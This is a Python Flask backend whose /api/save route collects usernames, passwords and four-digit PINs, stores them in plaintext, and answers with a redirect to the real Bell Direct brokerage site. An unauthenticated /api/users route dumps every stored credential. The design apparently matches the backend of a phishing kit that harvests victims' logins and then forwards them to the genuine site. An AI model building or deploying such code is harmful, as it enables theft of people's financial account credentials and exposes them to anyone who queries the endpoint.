from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

# ---------- File Paths ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
USERS_FILE = os.path.join(DATA_DIR, "users.txt")

# Ensure data folder + file exist
os.makedirs(DATA_DIR, exist_ok=True)
if not os.path.exists(USERS_FILE):
    open(USERS_FILE, "w").close()

# ---------- Redirect Target ----------
REDIRECT_URL = "https://belldirect.com.au/"


# ---------- Helpers ----------
def read_users():
    users = {}
    current = {}

    if not os.path.exists(USERS_FILE):
        return users

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()

            if not line:
                if current.get("username"):
                    users[current["username"]] = {
                        "pass": current.get("pass", ""),
                        "pin": current.get("pin", "")
                    }
                current = {}
                continue

            if ":" in line:
                key, value = line.split(":", 1)
                key = key.strip().lower()
                value = value.strip()

                if key == "username":
                    current["username"] = value
                elif key == "pass":
                    current["pass"] = value
                elif key == "pin":
                    current["pin"] = value

        if current.get("username"):
            users[current["username"]] = {
                "pass": current.get("pass", ""),
                "pin": current.get("pin", "")
            }

    return users


def user_exists(username):
    return username in read_users()


def save_user(username, password, pin):
    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"username : {username}\n")
        f.write(f"pass : {password}\n")
        f.write(f"pin : {pin}\n")
        f.write("\n")


# ================================================================
#  ROUTES (API only — no HTML)
# ================================================================
@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "ok",
        "message": "Backend is running"
    })


@app.route("/api/save", methods=["POST"])
def save():
    data = request.get_json()

    if not data:
        return jsonify({"success": False, "message": "No data provided"}), 400

    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    pin      = data.get("pin", "").strip()

    if not username or not password or not pin:
        return jsonify({"success": False, "message": "All fields required"}), 400

    if not pin.isdigit() or len(pin) != 4:
        return jsonify({"success": False, "message": "PIN must be 4 digits"}), 400

    if user_exists(username):
        return jsonify({"success": False, "message": "Username already exists"}), 409

    save_user(username, password, pin)

    print(f"💾 Saved: {username}")

    return jsonify({
        "success": True,
        "message": "Saved successfully ✅",
        "redirect_url": REDIRECT_URL
    })


@app.route("/api/users", methods=["GET"])
def list_users():
    return jsonify(read_users())


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("=" * 55)
    print("🚀 Backend API Server")
    print("=" * 55)
    print(f"📁 Users file: {USERS_FILE}")
    print(f"🌐 Port: {port}")
    print("=" * 55)
    app.run(host="0.0.0.0", port=port)